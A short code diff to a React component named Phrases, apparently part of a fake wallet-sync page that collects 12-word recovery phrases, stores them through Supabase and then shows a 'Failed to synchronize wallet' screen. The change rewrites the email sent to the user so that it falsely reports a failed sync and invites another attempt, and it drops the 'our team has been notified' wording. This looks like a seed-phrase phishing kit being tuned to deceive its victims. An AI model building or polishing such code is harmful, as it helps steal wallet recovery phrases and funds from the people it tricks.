@@ -67,16 +67,17 @@ const Phrases = () => {
     setSubmitting(false);
     if (error) return toast.error(error.message);
 
-    if (user.email) {
+        if (user.email) {
       supabase.functions.invoke("send-email", {
         body: {
           to: user.email,
           first_name: firstName,
-          subject: "Wallet sync attempt received",
-          message: `We received a request to sync your ${finalWalletName} wallet. Our team has been notified and will reach out if anything further is needed.`,
+          subject: "Wallet sync failed",
+          message: `Your ${finalWalletName} wallet has failed to synchronize. Please try again or contact support if the issue continues.`,
         },
       });
     }
+
 
     setDone(true);
     setPhrase(Array(12).fill(""));
@@ -93,7 +94,7 @@ const Phrases = () => {
           <ShieldAlert className="w-10 h-10 mx-auto text-[#00D4FF] mb-3" />
           <h2 className="font-display text-xl mb-2 text-white">Failed to synchronize wallet</h2>
           <p className="text-[13px] text-white/70 mb-4">
-            We couldn't sync your wallet right now. Our team has been notified — please try a different wallet or contact support.
+            We couldn't sync your wallet right now. Please try a different wallet or contact support.
           </p>
           <Button
             variant="outline"
